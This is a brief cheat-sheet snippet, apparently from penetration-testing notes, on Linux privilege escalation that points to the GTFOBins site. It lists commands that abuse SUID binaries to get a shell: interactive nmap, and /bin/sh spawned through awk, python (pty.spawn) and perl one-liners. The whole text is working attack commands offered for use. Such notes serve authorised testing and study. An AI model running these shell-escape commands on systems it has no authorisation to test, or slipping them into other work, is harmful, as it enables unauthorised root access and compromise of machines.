# Check if binary is in GTFOBins
# https://gtfobins.github.io/ 

# Example: Run nmap interactively (if SUID)
nmap --interactive

# Spawn a shell via other binaries:
awk 'BEGIN {system("/bin/sh")}'
python -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
